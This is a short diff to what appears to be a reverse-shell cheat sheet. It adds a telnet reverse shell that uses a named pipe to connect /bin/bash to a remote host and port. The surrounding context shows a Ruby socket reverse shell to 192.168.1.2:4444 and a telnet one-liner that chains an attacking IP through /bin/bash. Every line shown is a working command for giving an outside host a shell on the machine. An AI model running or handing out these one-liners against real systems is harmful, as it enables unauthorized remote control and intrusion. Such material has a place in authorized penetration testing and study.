@@ -75,6 +75,10 @@ ruby -rsocket -e'f=TCPSocket.open("192.168.1.2",4444).to_i;exec sprintf("/bin/sh
 ### **Telnet Reverse Shells**
 
 ```bash
+mknod backpipe p && telnet $ip $port 0<backpipe | /bin/bash 1>backpipe
+```
+
+```bash
 telnet ATTACKING-IP 80 | /bin/bash | telnet 192.168.1.2 4444
 ```
 
